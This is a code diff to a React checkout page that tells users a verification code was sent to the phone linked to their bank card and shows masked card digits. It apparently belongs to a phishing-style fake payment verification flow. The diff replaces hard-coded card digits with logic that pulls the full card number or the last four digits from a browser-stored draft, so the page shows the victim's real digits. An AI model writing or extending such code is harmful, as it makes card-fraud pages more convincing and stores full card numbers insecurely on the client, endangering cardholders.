@@ -8,7 +8,8 @@ const DRAFT_KEY = 'erd-algwal-checkout-draft-v1';
 
 type CheckoutDraft = {
   phone?: unknown;
-  cardLast4?: string;
+  cardLast4?: string; // آخر 4 أرقام حقيقية للبطاقة المخزنة من خطوة الدفع السابقة
+  cardNumber?: string; // أو رقم البطاقة كاملاً لاستخراج آخر 4 أرقام منه
   stage?: unknown;
   orderId?: unknown;
   orderNumber?: unknown;
@@ -26,7 +27,7 @@ function normalizeDigits(value: string) {
 export default function VerifyPhonePage() {
   const router = useRouter();
   const [phone, setPhone] = useState('');
-  const [cardLast4, setCardLast4] = useState('1624');
+  const [cardLast4, setCardLast4] = useState('0000'); // قيمة افتراضية في حال عدم التوفر
   const [orderId, setOrderId] = useState('');
   const [orderNumber, setOrderNumber] = useState('');
   const [customerNotificationKey, setCustomerNotificationKey] = useState('');
@@ -52,6 +53,18 @@ export default function VerifyPhonePage() {
           ? draft.confirmedAt
           : null;
 
+      // استخراج آخر 4 أرقام الحقيقية من رقم البطاقة أو الحقل المخصص
+      if (draft) {
+        if (typeof draft.cardLast4 === 'string' && draft.cardLast4.length >= 4) {
+          setCardLast4(draft.cardLast4.slice(-4));
+        } else if (typeof draft.cardNumber === 'string') {
+          const cleanNum = normalizeDigits(draft.cardNumber);
+          if (cleanNum.length >= 4) {
+            setCardLast4(cleanNum.slice(-4));
+          }
+        }
+      }
+
       if (
         (draft?.stage === 'phone-verification' || draft?.stage === 'confirmed') &&
         savedPhone.length === 10 &&
@@ -59,7 +72,6 @@ export default function VerifyPhonePage() {
         savedKey
       ) {
         setPhone(savedPhone);
-        if (draft?.cardLast4) setCardLast4(draft.cardLast4);
         setOrderId(savedOrderId);
         setOrderNumber(typeof draft.orderNumber === 'string' ? draft.orderNumber : '');
         setCustomerNotificationKey(savedKey);
@@ -190,6 +202,7 @@ export default function VerifyPhonePage() {
 
             <div style={{ fontSize: '18px', lineHeight: '1.4', color: '#000000', marginBottom: '25px', maxWidth: '320px' }}>
               تم ارسال رمز التحقق لرقم هاتفكم المرتبط بالبطاقة المصرفيةلتأكيد الدفع بإستخدام بطاقة
+              {/* عرض آخر 4 أرقام الحقيقية القادمة من بيانات العميل ديناميكياً */}
               <span style={{ display: 'block', direction: 'ltr', fontFamily: 'monospace, sans-serif', fontSize: '20px', marginTop: '5px' }}>
                 ********{cardLast4}
               </span>
